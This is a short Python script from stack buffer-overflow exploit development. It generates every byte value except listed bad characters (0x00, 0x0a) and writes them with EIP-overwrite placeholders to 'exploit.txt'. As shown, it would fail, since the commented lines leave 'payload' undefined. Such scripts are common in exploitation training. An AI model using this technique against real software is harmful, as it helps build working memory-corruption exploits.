import struct

bad_chars = [0x00,0x0a]      # As you find bad chars, add the hex number to this list, then re-run
test_chars = b''
for c in range(0x00,0x100):
    test_chars += struct.pack('B',c) if c not in bad_chars else b''

# payload = b'A' * offset
# payload += b'BBBB'        # Jam the EIP for now.
payload += test_chars

with open('exploit.txt', 'wb') as file:
    file.write(payload)